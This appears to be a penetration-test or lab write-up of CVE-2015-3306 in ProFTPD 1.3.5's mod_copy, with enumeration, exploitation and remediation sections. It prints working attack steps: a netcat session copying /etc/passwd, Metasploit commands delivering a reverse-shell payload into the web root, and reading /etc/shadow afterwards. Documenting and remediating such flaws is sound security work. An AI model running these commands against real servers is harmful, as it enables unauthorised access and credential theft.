# ProFTPD 1.3.5 mod_copy Remote Code Execution

## Summary

| Field | Detail |
|-------|--------|
| **CVE** | CVE-2015-3306 |
| **Affected Version** | ProFTPD 1.3.5 |
| **Attack Vector** | Network (FTP) |
| **Impact** | Remote Code Execution |

## Description

ProFTPD 1.3.5 includes the `mod_copy` module, which provides `SITE CPFR` and `SITE CPTO` commands for copying files on the server. These commands do not require authentication, allowing an unauthenticated attacker to copy arbitrary files between directories. By copying a malicious PHP payload into the web root, the attacker can achieve remote code execution via HTTP.

## Enumeration

```bash
nmap -sV TARGET_IP
```

| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | ProFTPD 1.3.5 |
| 80 | HTTP | Apache |

Verified `mod_copy` is active:

```bash
nc TARGET_IP 21
SITE CPFR /etc/passwd
# 350 File or directory exists, ready for destination name
SITE CPTO /tmp/test.txt
# 250 Copy successful
```

## Exploitation

**Module:** `exploit/unix/ftp/proftpd_modcopy_exec`

```bash
msf6 > use exploit/unix/ftp/proftpd_modcopy_exec
msf6 > set RHOSTS TARGET_IP
msf6 > set SITEPATH /var/www/html
msf6 > set payload cmd/unix/reverse_perl
msf6 > run
```

> Default `SITEPATH` is `/var/www`, but many systems use `/var/www/html`. Verify the correct web root before running. The `cmd/unix/reverse_perl` payload was used since Perl was available on the target.

**Post-exploitation:**

```bash
cat /etc/shadow
```

## Remediation

| Action | Priority |
|--------|----------|
| Update ProFTPD to latest version | Critical |
| Disable `mod_copy` in proftpd.conf | Critical |
| Migrate from FTP to SFTP | High |
| Restrict write permissions on web directories | High |

## References

- [CVE-2015-3306 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2015-3306)
- [ProFTPD mod_copy Documentation](http://www.proftpd.org/docs/contrib/mod_copy.html)
